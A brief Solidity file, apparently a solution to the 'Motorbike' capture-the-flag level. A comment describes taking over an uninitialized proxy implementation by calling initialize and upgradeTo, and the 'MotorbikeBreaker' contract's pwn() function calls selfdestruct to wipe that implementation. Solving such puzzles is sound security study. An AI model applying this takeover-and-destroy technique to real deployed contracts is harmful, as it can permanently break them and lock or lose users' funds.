// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

/**
    Get the contract from address from the implementation slot using the getStorageAt function 
    Get the address of the actual contract 
    call initialize on it to become the owner 
    and call upgradeTo method using this contrac

*/

contract MotorbikeBreaker {
  function pwn() public {
    selfdestruct(address(0));
  }
}